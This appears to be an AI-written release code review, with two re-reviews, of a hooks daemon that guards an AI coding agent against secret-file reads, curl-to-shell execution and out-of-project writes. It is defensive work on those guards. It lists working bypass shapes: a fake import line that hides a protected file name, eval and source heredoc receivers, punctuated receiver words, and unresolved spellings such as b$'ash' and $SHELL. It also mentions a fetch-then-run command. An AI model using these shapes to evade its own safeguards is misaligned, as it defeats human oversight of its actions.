# Code Review: release gate for the source diff since v3.61.0

**Reviewer:** code-reviewer (opus)
**Scope:** `git diff v3.61.0..HEAD -- src/` (87 commits, 144 files, +9,471/-551)
**HEAD reviewed:** `76976ed48790a6afac5fb75139ce2db36aaa2b41`
**Verdict:** FAIL — REQUEST CHANGES (2 blocking findings, both demonstrated by
executing the shipped code)

## Summary

The diff is, on the whole, unusually disciplined work: every new handler ships with
substantial tests, priorities land in the correct bands, and the new network-facing
subsystem (`remote_docs`) never uses a shell, never deserializes, and validates its
scheme before fetching. The full unit suite is green on this HEAD (15,584 passed,
2 skipped, 1 xfailed, 116s).

Two changes, however, narrow existing security-shaped guards in ways their own tests
do not cover, and both are regressions against v3.61.0 rather than pre-existing gaps.
Both were confirmed by running the shipped code, not inferred from reading it.

| Severity | Count |
| --- | --- |
| Blocking | 2 |
| Important (non-blocking) | 5 |
| Suggestion | 4 |

Reviewed with particular attention to the three areas named in the brief:
`project_containment` / `curl_pipe_shell` bypass paths, the secret-file guard's
content-leak routes, and provenance spoofing in the remote-docs capture path.

---

## Blocking issues

### B1. The protected-mention matcher's new import exemption is a general laundering primitive (Confidence: 95%)

**Location:** `src/claude_code_hooks_daemon/utils/secret_file_matching.py:274-303, 567-575`
(commit `c8ce2d7a`, "Stop the secret-file guard flagging an import of its own module")

**Problem**

The new `_import_module_tokens()` collects every dotted module path named by an
`import`/`from` statement anywhere in the text, and `find_protected_mention()` then
skips ANY token equal to one of those strings, wherever it appears:

    import_modules = _import_module_tokens(command)
    for token in _tokenise(command):
        if token in import_modules:
            continue

The exemption is keyed on STRING IDENTITY, not on POSITION. So prefixing a command
with a fake import statement naming the protected file makes every later occurrence
of that token invisible to the matcher.

**Evidence** (run against `src/` on this HEAD, with a neutral glob so the probe does
not name any real protected path):

    PATTERNS = ("*.privkey", "**/*.privkey")

    MENTION | plain read           | 'cat mykeys.privkey'                        -> '*.privkey'
    MISSED  | fake import line     | 'import mykeys.privkey\ncat mykeys.privkey' -> None
    MISSED  | fake from-line       | 'from mykeys.privkey import x\ncat ...'     -> None
    MISSED  | same line via ;      | 'import mykeys.privkey; cat mykeys.privkey' -> None
    MISSED  | leading whitespace   | '  import mykeys.privkey\ncat ...'          -> None

(probe retained at `/workspace/untracked/scratch/probe_mention.py`)

The single-line `;` form works because the regex is `^[ \t]*(?:from|import)[ \t]+(...)`
under `re.MULTILINE` and simply stops at the `;`. `import` is not a shell builtin, so
the laundering line fails harmlessly and the real command on the next line runs.

**Why it matters**

`find_protected_mention` is the sole gate on four surfaces, all of which DENY or
suppress:

- `secret_file_guard.py:188` — the Bash route (`route="bash"`).
- `secret_file_guard.py:244` — the script-authoring route, i.e. the write-then-execute
  closure. A Python or shell script containing `import mykeys.privkey` alongside
  `open("mykeys.privkey")` now passes.
- `flaggable_content_channel_guard.py:216` — a priority-14 safety handler.
- `daemon/payload_capture.py:71` — decides whether to SUPPRESS payload capture. A
  bypass here means a command naming a protected path has its payload written to disk.

The handler's own deny text states "There is NO escape hatch and no
self-declared-intent override. Only a human may lift this." This change creates one,
and it is trivially typed. The `_strict` variant is correctly left alone, so the
quarantine guard is unaffected.

**Suggested fix**

Exempt the SPANS rather than the TOKEN: blank the matched import statements out of the
text before `_tokenise`, so an occurrence inside an import disappears while the
identical string elsewhere in the command is still tokenised and matched. That keeps
the legitimate case the commit was fixing (an import of this package's own guard
module substring-matching the shipped default glob) and closes the laundering path. A
regression test in the shape of the table above belongs alongside it.

---

### B2. The heredoc exemption does not cover every receiver that executes the body (Confidence: 90%)

**Location:** `src/claude_code_hooks_daemon/handlers/pre_tool_use/curl_pipe_shell.py:131-164`
(commit `3b05019c`)

**Problem**

`_scannable()` blanks quoted-delimiter heredoc bodies unless a receiver is an
interpreter, testing membership against `_PIPED_INTERPRETERS`
(`bash sh zsh ksh dash python perl ruby`). Its docstring states the invariant plainly:

> The exemption stops at the receiver. `bash <<'EOF'` EXECUTES the body [...] Blanking
> those bodies would turn a documentation fix into a clean bypass of a
> safety-critical handler.

Three shapes execute a quoted heredoc body through a receiver that is NOT in that
list, so the body is blanked and the handler sees nothing.

**Evidence** (probe at `/workspace/untracked/scratch/probe_curl2.py`; in every case
the heredoc body was a network-fetch piped straight to a shell):

    ALLOW | eval "$(cat <<'EOF' ... EOF)"     receivers=['eval', '"$(cat']
    ALLOW | . /dev/stdin <<'EOF' ... EOF      receivers=['.', 'stdin']
    ALLOW | source /dev/stdin <<'EOF' ... EOF receivers=['source', 'stdin']
    DENY  | env bash <<'EOF'                  receivers=['env', 'bash']
    DENY  | timeout 5 bash <<'EOF'            receivers=['timeout', '5', 'bash']
    DENY  | nohup bash <<'EOF'                receivers=['nohup', 'bash']

In each ALLOW case the scannable text handed to the pattern was reduced to
`HEREDOC_BODY`. At v3.61.0 all three were DENIED, because `matches()` scanned the raw
command — so this is a regression introduced by this release, not a pre-existing gap.

The intended cases all still work and are worth keeping: the `git commit -F -` false
positive is fixed, and `bash <<'EOF'`, `/bin/sh <<'EOF'`, an unquoted `<<EOF`,
`sudo -E bash`, and `cat <<'EOF' | bash` (never blanked at all, because the body regex
requires a newline immediately after the opener) are all still denied.

**Why it matters**

This is the daemon's remote-code-execution guard: priority 10, terminal. I do not
claim these shapes are what an agent types by accident — they are not. But the
handler's stated contract is "when the body is executed, scan raw", and the
implementation does not uphold it, which is the class of gap a release gate exists to
catch. The fix is cheap and the error is asymmetric, as the docstring itself argues:
"the cost is a mention being denied, and the alternative cost is remote code
execution".

**Suggested fix**

Widen the withholding test beyond `_PIPED_INTERPRETERS`: treat `eval`, `source`, `.`,
and a receiver word of `/dev/stdin` or `-` as interpreters for the purposes of
`_scannable` only (they must not join `_PIPED_INTERPRETERS`, which drives the pipe
pattern itself). Add the three shapes above to `TestQuotedHeredocBodyIsData` as
still-blocked cases.

---

## Important issues (non-blocking)

### I1. `project_containment` does not resolve relative destinations for flag/positional commands (Confidence: 95%)

**Location:** `handlers/pre_tool_use/project_containment.py:247-282, 383-389`

Redirect and copy targets reach the handler already absolute, because
`get_bash_write_targets` resolves them against the hook's `cwd`
(`core/utils.py:288, 570-572`). The handler's own `_destination_targets()` extraction
returns RAW TOKENS, and `_is_outside()` then declares any non-absolute path "never
outside". Result (probe `/workspace/untracked/scratch/probe_containment.py`, root
`/repo`, cwd `/repo/sub`):

    DENY  | 'echo hi > ../../tmp/out.txt'                     -> ['/repo/sub/../../tmp/out.txt']
    ALLOW | 'curl https://example.com/x -o ../../../tmp/x.sh' -> ['../../../tmp/x.sh']
    ALLOW | 'wget https://example.com/x -O ../../../tmp/x.sh' -> ['../../../tmp/x.sh']
    ALLOW | 'mkdir -p ../../../tmp/newdir'                    -> ['../../../tmp/newdir']
    ALLOW | 'tar -cf ../../../tmp/a.tar src'                  -> ['../../../tmp/a.tar']
    ALLOW | 'rsync -a src/ ../../../tmp/dest/'                -> ['../../../tmp/dest/']

Two commands with identical effect get opposite verdicts purely by extraction route.
The stated rationale — "it resolves against a working directory the daemon does not
know" — is contradicted by the sibling accessor one layer down, which does know it
(`HookInputField.CWD`). `.resolve()` in `_is_within` already normalises `..`
correctly, so the fix is to run `_destination_targets` output through the same
cwd-join before the containment test.

Marked non-blocking because the guard's premise is durability hygiene rather than
security, and reaching it needs a deliberately relative traversal — but it is a real
hole in a new deny-by-default handler and the fix is a few lines.

Related, and worth stating in the guidance rather than fixing: `cd /tmp && echo hi >
out.txt` resolves against the SESSION cwd, so the handler names `/repo/sub/out.txt`
and allows a command that writes `/tmp/out.txt`. That is the shared accessor's
documented limit, not new here.

### I2. A trailing slash makes a copy destination vanish (Confidence: 90%)

**Location:** `core/utils.py:557-558` (`_resolve_write_target`), consumed by
`project_containment._named_targets`

`_resolve_write_target` declines any token ending in `/`:

    DENY  | 'cp /repo/README.md /tmp/copy.md'  -> ['/tmp/copy.md']
    DENY  | 'install -m 644 a.txt /tmp/b.txt'  -> ['/tmp/b.txt']
    ALLOW | 'cp README.md /tmp/'               -> []          <-- trailing slash

`cp report.md /tmp/` is arguably the most natural spelling of the thing this handler
exists to stop, and the resident guidance the handler publishes says its list of
covered shapes is "exhaustive, not illustrative" and includes cp / mv / install / dd
destinations. Declining is correct for a CONTENT guard (nothing is authored at
`/tmp/`), but a containment guard wants `dest/<basename>` — which `_written_paths`
already computes for the no-slash form. Cheapest fix: strip a single trailing `/`
before the `is_dir()` branch, or normalise it in the containment handler.

The accessor itself is unchanged in this diff, so this is a gap the new handler
inherits rather than one it introduced.

### I3. A leading-wildcard `vendor_exceptions` entry disables ALL docs-QA pruning, including `.git` and `untracked/` (Confidence: 95%)

**Location:** `docs_qa/checks/source_tree_markdown.py:_walk_into`,
`docs_qa/checks/module_doc_budget.py:_walk_into`

    excluded = rel_parts[-1] in _OWN_EXCLUDED_DIR_NAMES or is_vendored_path_in_scopes(...)
    if excluded and not may_contain_vendor_exception_in_scopes(rel_dir, vendor_scopes):
        return False

`may_contain_vendor_exception` returns True unconditionally for any pattern with no
literal prefix, so one `**/ours/**` entry un-prunes everything — including the two
names that have nothing to do with vendoring:

    no exceptions:              .git False  untracked False  node_modules False  src True
    leading-wildcard exception: .git True   untracked True   node_modules True   src True

(probe `/workspace/untracked/scratch/probe_walk.py`)

A vendor exception can never live inside `.git` or `untracked/`, so the conservative
fallback should not apply to `_OWN_EXCLUDED_DIR_NAMES`. In this repository
`untracked/` alone holds virtualenvs and worktrees; walking it on every sweep would be
a significant, silent slowdown. Config-gated, hence non-blocking.

### I4. `_close_session` raises from a `finally`, replacing the real fetch error — and its docstring says it must not (Confidence: 95%)

**Location:** `remote_docs/fetchers.py:131-149, 204-210`

The docstring states:

> A failure to close is logged by the caller's exception path rather than masking the
> original error, so the close result is deliberately not inspected [...] raising here
> would replace a real fetch error with a cleanup one.

The body then does exactly that — `raise CaptureError(...)` — and it runs inside
`finally:`, so a `CaptureError` from the fetch is superseded by the cleanup error. The
most likely trigger (a missing or renamed binary) makes BOTH raise, and the operator
sees the reap failure instead of the fetch failure. Either restore the documented
behaviour (log at warning, do not raise) or correct the docstring; as it stands the
rationale on the page is false. Note this appears to be collateral from commit
`a734b19d`, whose message records an error-hiding audit.

### I5. `deploy_core_docs_if_enabled` sends every core document to `workflow_docs`'s directory (Confidence: 75%)

**Location:** `install/core_docs.py:368-381`

    workflow_docs = PurePosixPath(config.plan_workflow.workflow_docs)
    return deploy_core_docs(project_root, str(workflow_docs.parent), {...}, names)

Only `PlanWorkflow` has a config key of its own. `Worktree` and
`DocumentationStrategy` are named by handler and check text as `CLAUDE/Worktree.md`
and `CLAUDE/DocumentationStrategy.md`, but with `plan_workflow.workflow_docs:
docs/agent/PlanWorkflow.md` they would be deployed under `docs/agent/` — recreating
the precise defect the module exists to fix ("guidance names a file that does not
exist") for the two documents that cannot be renamed. Correct in the default
configuration, which is why this is non-blocking. Also note `workflow_docs:
"PlanWorkflow.md"` (no directory) yields `parent == "."` and would scatter `core/`
into the project root.

---

## Suggestions

- **Frontmatter injection surface in capture** (`remote_docs/capture.py:176-186,
  228-229`). `source_url` is written verbatim from the CLI argument while `urlparse`
  strips ASCII newlines before the scheme check, and `fetch_method` interpolates
  `normalised.source`, which originates in the fetched tool's JSON output
  (`fetchers.py:181`). Neither is validated against control characters, so a value
  carrying a newline could add or override frontmatter fields. The FETCHED DOCUMENT
  BODY cannot spoof provenance — it is appended strictly after the closing `---`, and
  `parse_provenance` reads the first block only — so the brief's specific concern is
  satisfied. Still worth rejecting control characters in both values, since they end
  up in a record that gates later behaviour.
- **Per-event config reads in `remote_docs_routing`.** `_config_reader()` calls
  `Config.load_or_default()` from disk on every `WebFetch` match check, and
  `find_document()` reads and YAML-parses EVERY file in the tree per fetch. Both run
  inside `matches()` and then again inside `handle()`. Consider caching the config on
  the handler and consulting the generated `.claude/REMOTE-DOCS.md` index (or an
  mtime-keyed cache) for lookup.
- **`pytest_text_report` counts are still scraped from the whole stream.** The new
  `_summary_section()` correctly confines NODE-ID scraping to the banner, and the
  comment says "the counts are parsed separately from the totals line" — but `_count()`
  still searches the entire ANSI-stripped text, so a subprocess log line containing
  "0 failed" ahead of pytest's real totals would flip `passed_all` green. Scope the
  count patterns to the totals line too. (The new error-count handling itself is a
  genuine fix: an errored run really was reading as green.)
- **`matches()` recomputes what `handle()` immediately recomputes** in
  `project_containment` (full tokenise plus extraction, twice per event) and in
  `remote_docs_routing` (`_read_advisory` reads the file twice). Not a correctness
  issue, but both sit on the hot path of every Bash or Write event.

## Positive observations

- **Test discipline is genuine, not theatre.** 407 lines for `project_containment`,
  290 for `remote_docs_routing`, 263 for provenance parsing — and the tests assert
  behaviour and NAMED LIMITS (the interpreter one-liner is pinned as
  deliberately-not-matched; `/repo-backup` versus `/repo` is pinned as the classic
  containment failure). Near-miss ALLOW cases sit beside the DENY cases throughout.
- **`remote_docs` is clean where it counts.** `yaml.safe_load`, no `shell=True`,
  scheme validated before `urlopen` on both the raw and browser paths, no dynamic
  execution or unsafe deserialization, path derivation that cannot emit `..` or an
  absolute path (`_sanitise_segment`), truncated captures refused rather than
  vendored, and the captured bytes scanned by the project's own sensitive-content
  matcher BEFORE they reach disk — with `scan_text` correctly reporting only a
  secret-word INDEX, never the term.
- **Priorities are all in-band and justified in place**: 14 (safety) for containment,
  36/37/38 (workflow) for the remote-docs gates, 68 with `ADVISORY_MAX` widened to
  match. `test_it_runs_before_every_repo_relative_path_rule` pins the one ordering
  constraint that actually matters.
- **The `markdown_organization` segment-alignment fix** (`_segment_aligned_index`) is a
  real latent bug caught and closed: a plain substring search let `remote-docs/`
  collapse into `docs/` and classify a separate top-level tree as the human docs tree.
- **The vendor-scope refactor is well-reasoned**, in particular
  `is_vendored_path_in_scopes` explicitly rejecting a union across projects, and
  `resolve_vendor_scope` using longest-root-wins so YAML ordering cannot change the
  answer. `COMMON_VENDORED_BUILD_DIR_NAMES` is now an alias of
  `CORE_VENDORED_BUILD_DIR_NAMES` with a test pinning the equality, so the rename
  changed no behaviour.
- **No if/elif dispatch on language or type names** anywhere in the new code; the
  strategy registries are used as designed. No debug code, no leftover TODOs, no
  suppression annotations introduced. The two `nosec` markers added sit on genuine
  false-positive sites and are each explained at length.

## Verdict

**REQUEST CHANGES.** B1 and B2 should be fixed before the tag. Both are small,
localised changes with obvious regression tests, and neither requires rethinking the
design it came from — the designs are right, the span and receiver tests are simply
too narrow. Everything under "Important" and "Suggestions" is explicitly non-blocking
and can ship as follow-up work.

If the release owner judges B2 to be acceptable residual risk (obfuscated
remote-execution bypasses being unbounded in general), B1 alone still warrants the
block: it is a typed, one-line escape hatch around a guard that publishes "there is no
escape hatch", and it reaches the payload-capture suppression path as well as the two
deny paths.

## Verification performed

- Full unit suite on this HEAD: `pytest tests/unit -x -q` -> 15,584 passed, 2 skipped,
  1 xfailed, 0 failed (115.76s).
- Behavioural probes against the shipped modules, retained under
  `/workspace/untracked/scratch/`: `probe_containment.py`, `probe_curl.py`,
  `probe_curl2.py`, `probe_mention.py`, `probe_walk.py`.
- Read in full: `project_containment.py`, all three `remote_docs_*` handlers,
  `remote_docs/{capture,fetchers,provenance,store,lookup,index}.py`,
  `install/core_docs.py`, `utils/{scratch_dir,vendor_paths,shell_segmentation}.py`,
  and the `secret_file_matching` / `path_exclusion` / `curl_pipe_shell` /
  `pipe_blocker` diffs. Remaining changed files reviewed by diff.

---

# Re-review of b149808f

**Re-reviewed:** `b149808f` ("Close two guard bypasses this release would have shipped").
**Note on HEAD:** the branch has since advanced to `d98debf0` (plan-index ageing
only). Both guard files are byte-identical between `b149808f` and the working tree
(`git diff b149808f HEAD` and `git diff` are both empty for them), so everything below
was probed against exactly the fixed code.
**Suite:** 15,595 passed, 2 skipped, 1 xfailed (was 15,584 — the +11 are the new
regression tests).

**Updated verdict: FAIL — one blocking finding remains (B3, new).**

Both original blocking findings are genuinely fixed and survive adversarial attack.
The B2 fix is, however, incomplete in a way neither of us named: the receiver
vocabulary was widened, but the receiver TOKENISATION was not, and seven further
shapes execute a blanked body.

## B1 — VERIFIED FIXED (Confidence: 95%)

`_without_import_module_paths()` replaces identity-keyed exemption with span deletion,
exactly as recommended. Attacked with 18 shapes; all detected, and the four
legitimate cases stay clean (probe `/workspace/untracked/scratch/probe_mention2.py`):

    MENTION | orig laundering 1 (newline)          MENTION | import then && on same line
    MENTION | orig laundering 2 (from)             MENTION | import then pipe
    MENTION | orig laundering 3 (semicolon)        MENTION | CRLF-ish line start
    MENTION | orig laundering 4 (indent)           MENTION | import inside quotes, real read after
    MENTION | tab after import                     MENTION | trailing-dot module then read
    MENTION | double space                         MENTION | subdir path read
    MENTION | disclosure BEFORE import             MENTION | glob-shaped read
    MENTION | import is a PREFIX of token          MENTION | redirect read
    MENTION | many imports                         MENTION | plain read
    clean   | bare module import (motivating case) clean   | from-import of a module
    clean   | import ... as                        clean   | no protected token at all

    failures: 0

I also argued it structurally rather than only empirically, which is what makes me
confident there is no 19th shape: the deletion can only remove a span matching
`[A-Za-z_][A-Za-z0-9_.]*` sitting in module position of a LINE-START import. For a
laundering shape to exist, the DISCLOSING occurrence would have to sit in that
position — and a token there is an argument to `import`/`from`, not to a reader.
`import` is not a shell builtin and `from` is not a command, so nothing in that
position discloses content. The grammar admits no `/`, so a slash path is untouched
either way.

Two observations, neither a defect:

- **`python3 -c 'import pkg.a.b_guard'` is still flagged** (probe
  `probe_mention3.py`), because `_IMPORT_MODULE_RE` is line-anchored and the `import`
  there is mid-line. This is unchanged from the pre-fix code — the old
  `_import_module_tokens()` used the same anchored regex and would not have captured
  it either — so it is not a regression. The commit's motivating case is the
  SCRIPT-AUTHORING route (a Python file whose content starts a line with the import),
  and that is exempt. If the inline Bash spelling matters, it is a follow-up, not a
  release concern.
- **A prose mention of a dotted module path in the same file as its import is now
  flagged**, where the identity-keyed version exempted it. That is the intended
  narrowing (over-blocking is the cheap error) and matches v3.61.0 behaviour.

## B2 — the three reported shapes are FIXED; the guards hold (Confidence: 95%)

`eval "$(cat <<'EOF' …)"`, `. /dev/stdin <<'EOF'` and `source /dev/stdin <<'EOF'` all
DENY again, and all four data-body cases (git commit `-F -`, `git tag -F -`, `cat >`
a doc, `tee` a doc) still ALLOW. The two added guard tests pin the right pair.

### On deviation 1 — omitting `-`: correct decision, wrong reason

Agree with the outcome, but the stated justification does not hold and it is worth
correcting so the comment does not mislead a later maintainer.
`quoted_heredoc_receivers` already filters every word beginning with `-`
(`shell_segmentation.py:214`: `if word and not word.startswith("-")`), so `-` can
never appear in the receiver list at all. Including it would have been INERT, not
harmful — it could not have re-broken `git commit -F -`, because that `-` never
reaches the comparison.

I could not find a `-` shape that is left open. The spellings that genuinely execute
all name the interpreter as a separate word, and each is caught on that word:
`sh - <<'EOF'`, `python3 - <<'EOF'`, `bash -s -- <<'EOF'`, `bash /dev/stdin <<'EOF'`.
Recommend keeping the decision and rewording the comment to cite the `-`-prefix filter.

### On deviation 2 — equality over prefix: correct, but it is not the axis that matters

Equality is right for `.`; prefix matching would swallow any receiver beginning with a
dot. But neither equality nor prefix closes the real gap, because the receivers arrive
carrying shell punctuation — which is B3.

## B3 (NEW, blocking). Receiver words are never normalised, so shell punctuation defeats both lists (Confidence: 95%)

**Location:** `src/claude_code_hooks_daemon/utils/shell_segmentation.py:205-216`
(`quoted_heredoc_receivers`), consumed only by `curl_pipe_shell._scannable`.

**Problem**

`quoted_heredoc_receivers` reduces each word with `word.rsplit("/", 1)[-1]` and nothing
else. Bash, deciding what command a word names, also removes quoting and grouping
punctuation. So a receiver that bash resolves to `bash` is reported as `(bash`,
`"bash"`, `'bash'`, `\bash` or `ba"sh"` — matching neither `_PIPED_INTERPRETERS`
(by `startswith`) nor `_HEREDOC_EXECUTORS` (by equality). The exemption is granted,
the body is blanked, and the handler sees nothing.

**Evidence.** Each candidate was syntax-checked with `bash -n` (parse only, never
executed, and with the body swapped for `echo hello` so no shell is ever handed the
real payload). `v3.61.0` is this handler's pre-exemption behaviour, reproduced by
scanning the raw command. Probe: `/workspace/untracked/scratch/probe_curl4.py`.

    parses  now      v3.61.0  shape                      receivers
    Y       ALLOW    DENY     (bash <<'EOF' … EOF )      ['(bash']
    Y       ALLOW    DENY     "bash" <<'EOF'             ['"bash"']
    Y       ALLOW    DENY     'bash' <<'EOF'             ["'bash'"]
    Y       ALLOW    DENY     \bash <<'EOF'              ['\\bash']
    Y       ALLOW    DENY     ba"sh" <<'EOF'             ['ba"sh"']
    Y       ALLOW    DENY     (eval "$(cat <<'EOF' …)")  ['(eval', '"$(cat']
    Y       ALLOW    DENY     "eval" "$(cat <<'EOF' …)"  ['"eval"', '"$(cat']
    Y       DENY     DENY     { bash <<'EOF' … }         ['{', 'bash']      (control)
    Y       DENY     DENY     bash <<'EOF'               ['bash']           (control)

All seven ALLOW rows execute the heredoc body and were DENIED at v3.61.0.

**Why this is the same finding as B2, not a new mistake**

Five of the seven turn on `_PIPED_INTERPRETERS`, not on the new `_HEREDOC_EXECUTORS`,
so `(bash <<'EOF'` was already a bypass at `76976ed4` — introduced by `3b05019c`
earlier in this same release, and reachable by the same reasoning that made B2
blocking: the handler's stated invariant is "when the body is executed, scan raw", and
here it is not. B2's fix widened the vocabulary; this is the tokenisation axis, which
neither of us named. My own suggested fix would not have caught it either.

It also inverts the helper's own documented safety direction. Its docstring says the
basename reduction produces "intentional over-reporting […] For a caller deciding
whether to WITHHOLD an exemption that is the safe direction — it withholds one, it
never grants one." Punctuation makes it UNDER-report, which grants one.

**Suggested fix** — one change, in the helper, fixing both lists at once:

    _GROUPING = "(){}`\\$"

    def _command_word(word: str) -> str:
        unquoted = word.replace('"', "").replace("'", "")
        return unquoted.lstrip(_GROUPING).rsplit("/", 1)[-1]

applied where `word.rsplit("/", 1)[-1]` is today. Prototyped and verified against
every shape above (`/workspace/untracked/scratch/probe_curl5.py`): all nine executing
bodies withhold the exemption, and all five data bodies (`git commit -F -`,
`git tag -F -`, `cat >` a doc, `tee` a doc, `cat >` a text file) keep it.

Blast radius is small: `curl_pipe_shell` is the only consumer in `src/`. The one new
over-report I could construct is a redirect target literally named `source` or `eval`
(`cat > ./source <<'EOF'` mentioning the anti-pattern would be denied) — which is the
helper's documented safe direction, and a shape nobody writes.

**Confidence note.** I am 95% confident the shapes are real (parsed by bash, verdicts
observed) and that the fix closes them. I am less certain the LIST is now complete —
which is the honest argument for fixing the tokenisation rather than adding more
entries: normalising the word closes a family, whereas enumerating spellings closes
whichever ones we happened to think of.

## Regression check on the five non-blocking findings

`b149808f` touches two source files (`secret_file_matching.py`,
`curl_pipe_shell.py`) plus their tests; `d98debf0` touches only plan documents.
Neither commit goes near `project_containment`, `core/utils.py`, the docs-QA walkers,
`remote_docs/fetchers.py` or `install/core_docs.py`.

- **I1** (relative destinations unjudged) — unchanged, still non-blocking.
- **I2** (trailing-slash copy destination) — unchanged, still non-blocking.
- **I3** (leading-wildcard vendor exception un-prunes `.git`/`untracked`) — unchanged.
- **I4** (`_close_session` raises from `finally` against its docstring) — unchanged.
- **I5** (core docs deployed under `workflow_docs`' directory) — unchanged.

Nothing in the diff makes any of them worse, and none of them interacts with B3.

## Updated verdict

**FAIL — one blocking finding (B3).** B1 and B2 are properly closed, with regression
tests that pin both the bypass and the legitimate case; the two deviations from my
suggested fix were both the right call, with one correction to the `-` reasoning that
should go into the comment. What remains is the tokenisation half of B2: seven
bash-valid shapes that execute a heredoc body, were denied at v3.61.0, and are allowed
now — five of them via the interpreter list that predates the fix.

The remedy is a single normalisation in one shared helper with one consumer, already
prototyped against every case above. Once it is in with tests for two or three of the
shapes, I expect to return PASS.

---

# Re-review of 67471f47

**Re-reviewed:** `67471f47` ("Normalise heredoc receiver words, so punctuation cannot
defeat the guard"), which is HEAD.
**Suite:** 15,603 passed, 2 skipped, 1 xfailed (+8 from the new tests).
**Blast radius:** `b149808f..67471f47` touches two source files —
`shell_segmentation.py` (the new `_command_word`, plus its single call site) and a
comment correction in `curl_pipe_shell.py`. `_command_word` has exactly one caller and
`quoted_heredoc_receivers` has exactly one consumer, so nothing outside this handler
changed behaviour.

**Updated verdict: PASS.**

## B3 — CLOSED (Confidence: 95%)

I attacked the normalisation with 34 ordinary receiver spellings, including every one
suggested: a leading `!`, `;`/`&&`/`|`-adjacent words with no space, tab separation,
nested `$(`/backtick substitution, and a doubled subshell. Every one denies. Probe:
`/workspace/untracked/scratch/probe_curl6.py`; each candidate parse-checked with
`bash -n`, body swapped for `echo hello`.

    ordinary receivers that execute -- 34 of 34 DENY, no misses

    bash · /bin/bash · sudo -E bash · env bash · /usr/bin/env bash · command bash ·
    exec bash · time bash · nice -n 5 bash · docker exec -i c bash · ssh host bash ·
    (bash …) · ((bash …)) · { bash …; } · "bash" · 'bash' · ba"sh" · \bash ·
    ! bash · true;bash · true&&bash · echo x|bash · bash<TAB> · bash<2 spaces> ·
    sh - · python3 - · bash -s -- · . /dev/stdin · source /dev/stdin ·
    (source /dev/stdin …) · eval "$(cat …)" · (eval "$(cat …)") · "eval" "$(cat …)" ·
    eval "`cat …`"

Two of those are worth calling out because they were NOT in my prototype and the fix
handles them anyway: `((bash` (both parens stripped by `lstrip`) and the backtick
spelling of the eval substitution.

The four data bodies still get their exemption, and so do seven further data-heredoc
shapes I added as controls — `git commit -F -`, `git tag -a -F -`, `cat >` a `.md`,
`cat >>`, `tee`, `sort >`, `psql`, `mysql`, `ftp`, and `cat > eval.md` (which does NOT
trip the `eval` entry, because the basename keeps its suffix). The exemption has not
started swallowing what it exists for.

The comment correction on `-` is accurate and now cites the operative mechanism.

## Residual: word-expansion spellings (NOT blocking, but should be written down)

Six shapes still execute a blanked body. All six were denied at v3.61.0, and I am
recording them so the limit is a decision rather than a surprise:

    b$'ash'        -> receiver 'b$ash'      (ANSI-C quote, interior $)
    $'\x62ash'     -> receiver 'x62ash'     (hex escape)
    b\ash          -> receiver 'b\ash'      (interior backslash; lstrip is leading-only)
    \b\a\s\h       -> receiver 'b\a\s\h'
    $SHELL         -> receiver 'SHELL'      (variable indirection)
    ${SHELL}       -> receiver 'SHELL}'

**Why I do not consider these release-blocking, when I did block on B2 and B3.**
The criterion I have been applying is not "was it denied at v3.61.0" — that was
evidence, not the test. The test is whether the stated invariant fails somewhere a
person or an attacker plausibly reaches, AND whether closure is verifiable:

- B2 and B3 were ordinary shell idioms. `eval "$(cat <<'EOF')"` is how you would
  naturally write heredoc-to-eval; `(bash …)` and `"bash"` are ordinary style. Both
  families were finite, so I could enumerate them and prove closure — and did.
- These six are not idioms. `\b\a\s\h` and `$'\x62ash'` have no legitimate use; they
  are artefacts of evading a scanner. And the family is unbounded: `${x:0:0}bash`,
  `$(printf bash)`, `b${e}ash` and indefinitely many more mean the same thing. No
  finite normalisation closes it, so blocking here would demand work that cannot be
  completed and the next pass would find a seventh spelling.
- `$SHELL` is inherently unresolvable: naming it requires executing the command, which
  a PreToolUse hook must never do. It is the same documented limit as
  `project_containment`'s `> "$OUT"` and its interpreter one-liner.
- The handler already concedes this class. Anyone who can write `b$'ash'` can write
  `curl -o /t/s <url>; bash /t/s`, which defeated this guard at v3.61.0 too.

**Recommended follow-ups, neither urgent:**

1. **Say it out loud.** The handler's docstring and resident guidance should state that
   a receiver word constructed through expansion is not resolved, using the framing
   `project_containment` already uses for its own gap: a clean command is not evidence
   the body is inert, only that no RECOGNISED receiver named an interpreter.
2. **Consider inverting the test** — withhold the exemption unless the receiver is a
   recognised NON-executing sink (`git`, `cat`, `tee`, `psql`, …), rather than
   withholding only when it is a recognised interpreter. That flips the residue's
   failure direction from "grant on an unknown word" to "withhold on an unknown word",
   which is the direction the helper's own docstring promises. It is a real design
   trade, not a free win: the allowlist would need to grow with every legitimate
   data-heredoc receiver, and each omission costs a false denial. Owner's call.

## Non-blocking note: `jq -r . <<'EOF'` now withholds the exemption

`.` is in `_HEREDOC_EXECUTORS` as the sourcing builtin, but it is also jq's identity
filter, and receivers include EVERY word of the segment. So `jq -r . <<'EOF'` — an
ordinary shape whose body is JSON data — has its exemption withheld, and a body that
mentions the anti-pattern would be denied. Introduced by B2's fix, not B3's, and the
direction is safe (over-blocking). If it ever bites, the narrow fix is to consider `.`
only in first-word position, where the sourcing builtin actually sits.

## Non-blocking findings I1-I5: unchanged

`b149808f..67471f47` touches only `shell_segmentation.py` and `curl_pipe_shell.py`.
None of I1 (relative destinations), I2 (trailing-slash copy destination), I3
(vendor-exception pruning), I4 (`_close_session`) or I5 (core-doc directory) is
affected, and nothing in the diff makes any of them worse.

## Final verdict

**PASS.** All three blocking findings are closed, each with regression tests that pin
both the bypass and the legitimate case it must not break. The ordinary receiver space
is complete as far as I can construct it (34 shapes, zero misses), the exemption still
works for every data-heredoc shape I tried (11 of them), and the suite is green at
15,603.

I believe this PASS. The residue above is real and I would rather it were documented
than closed by a seventh round of enumeration — but it is an unbounded obfuscation
class this handler never covered, not the reachable, finite families that made B1, B2
and B3 worth blocking on.
